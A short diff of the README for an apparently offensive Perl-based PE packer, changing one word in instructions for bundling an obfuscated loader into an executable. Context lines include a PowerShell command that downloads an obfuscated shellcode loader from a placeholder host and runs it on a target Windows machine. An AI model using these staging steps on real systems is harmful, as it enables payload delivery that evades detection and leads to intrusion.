@@ -73,7 +73,7 @@ C:\path\perl\bin> perl.exe .\Invoke-Perl-Pepacker.pl PE-to-pack.exe obfuscated_P
     C:\temp\perl-portable\perl\bin> powershell -c "wget -uri http://X.X.X.X/obfuscated_shellcodeloader.pl -OutFile C:\temp\perl-portable\perl\bin\obfuscated_shellcodeloader.pl"
     C:\temp\perl-portable\perl\bin> perl.exe .\obfuscated_shellcodeloader.pl
 ```
-  - Option C (not recommended): Use Perl2Exe or "Strawberry Perl + PAR::Packer" to bundle the obfuscated shellcode loader Perl script into a single executable (e.g. script.exe) and then download and execute it on a target Windows computer
+  - Option C (not recommended): Use Perl2Exe or "Strawberry Perl + PAR::Packer" to bundle the obfuscated PE loader Perl script into a single executable (e.g. script.exe) and then download and execute it on a target Windows computer
 ```
 1 - Bundle the obfuscated shellcode loader Perl script into a single executable (e.g. script.exe)
     Example with "Strawberry Perl + PAR::Packer":
